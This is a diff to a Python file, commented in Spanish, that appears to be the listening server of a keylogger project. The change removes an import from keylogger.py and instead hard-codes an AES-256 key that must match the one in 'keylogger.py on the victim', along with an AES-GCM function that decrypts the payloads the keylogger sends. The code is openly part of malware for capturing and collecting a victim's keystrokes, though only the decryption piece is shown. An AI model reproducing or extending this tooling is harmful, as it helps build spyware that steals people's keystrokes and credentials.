@@ -24,14 +24,49 @@ Los payloads cifrados (evidencia MITM) en ./logs/raw_encrypted.bin
 """
 
 import os
-import sys
 import struct
 import logging
 import datetime
 import socketserver
 
-sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
-from keylogger import AES_KEY, decrypt_payload
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+
+# ──────────────────────────────────────────────────────────────────────────────
+# CLAVE AES-256 (debe ser idéntica a la del keylogger.py en la víctima)
+# ──────────────────────────────────────────────────────────────────────────────
+
+AES_KEY: bytes = bytes([
+    0x3A, 0xF1, 0x7C, 0x9E, 0x42, 0xBD, 0x05, 0x6F,
+    0xC8, 0x21, 0xEA, 0x3D, 0x90, 0x54, 0x18, 0xAB,
+    0x77, 0xCC, 0xFE, 0x0B, 0x2E, 0x61, 0xD4, 0x83,
+    0x5B, 0x96, 0x1A, 0xE7, 0x0F, 0x48, 0xD9, 0x22,
+])
+
+
+def decrypt_payload(ciphertext: bytes, key: bytes) -> bytes:
+    """
+    Descifra un payload AES-256-GCM.
+
+    Formato del payload (producido por keylogger.py):
+        [12 bytes nonce] [N bytes ciphertext+tag GCM]
+
+    Parámetros
+    ----------
+    ciphertext : bytes  Payload cifrado recibido del keylogger.
+    key        : bytes  Clave AES-256 de 32 bytes (compartida con el keylogger).
+
+    Retorno
+    -------
+    bytes  Texto en claro descifrado y autenticado.
+
+    Excepciones
+    -----------
+    InvalidTag  Si el tag GCM no coincide (posible manipulación MITM).
+    """
+    nonce      = ciphertext[:12]
+    cipherdata = ciphertext[12:]
+    aesgcm     = AESGCM(key)
+    return aesgcm.decrypt(nonce, cipherdata, None)
 
 # ──────────────────────────────────────────────────────────────────────────────
 # CONFIGURACIÓN
